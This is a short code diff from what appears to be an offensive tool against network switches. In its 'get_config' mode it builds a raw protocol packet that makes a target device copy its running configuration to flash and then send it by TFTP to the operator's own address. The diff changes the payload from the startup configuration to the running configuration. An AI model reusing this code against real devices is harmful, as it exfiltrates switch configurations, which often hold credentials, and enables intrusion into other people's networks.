@@ -158,8 +158,11 @@ def change_tftp(mode,current_ip): #Send package for changing tftp address
         sTcp = sDump1 + ('%02x' % int(sTime[0:2])) + '0' * 6 + ('%02x' % int(sTime[3:5])) + '0' * 264 + fConf.encode('hex') + sDump2
 
     elif mode == 'get_config':
-        c1 = 'copy nvram:startup-config flash:/config.text'
-        c2 = 'copy nvram:startup-config tftp://' + my_ip + '/' + current_ip + '.conf'
+        #need more test with this payload ( "system:" may be more usefull then "nvram:"
+        #c1 = 'copy nvram:startup-config flash:/config.text'
+        #c2 = 'copy nvram:startup-config tftp://' + my_ip + '/' + current_ip + '.conf'
+        c1 = 'copy system:running-config flash:/config.text'
+        c2 = 'copy flash:/config.text tftp://' + my_ip + '/' + current_ip + '.conf'
         c3 = ''
 
         sTcp = '0'*7 + '1' + '0'*7 + '1' + '0'*7 + '800000' + '40800010014' + '0'*7 + '10' + '0'*7 + 'fc994737866' + '0'*7 + '0303f4'
